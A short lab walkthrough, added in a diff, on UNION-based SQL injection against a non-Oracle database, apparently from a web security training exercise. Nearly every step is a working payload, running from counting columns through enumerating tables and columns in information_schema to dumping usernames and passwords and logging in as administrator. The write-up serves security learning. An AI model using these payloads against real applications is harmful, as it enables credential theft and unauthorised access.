@@ -1,0 +1,25 @@
+SQL injection attack, listing the database contents on non-Oracle databases
+
+We start by finding the number of columns:
+
+'+UNION+SELECT+NULL,NULL--
+
+Then the columns with text:
+
+'+UNION+SELECT+'asdf','asdf'--
+
+Refering to the cheatsheet, we use the following payload to get the table names:
+
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+
+Now we start looking for an users table. It should look something like users_SOMETHING. 
+In my case it's users_hnwjqa
+
+Payload to retrieve details:
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_hnwjqa'--
+
+There should be a user and a password in the page displayed. Let's use them to get all the users and passwords:
+
+'+UNION+SELECT+username_rblgyx,+password_reluer+FROM+users_hnwjqa--
+
+Use the newly discovered credentials to log in as administrator and claim your victory. 
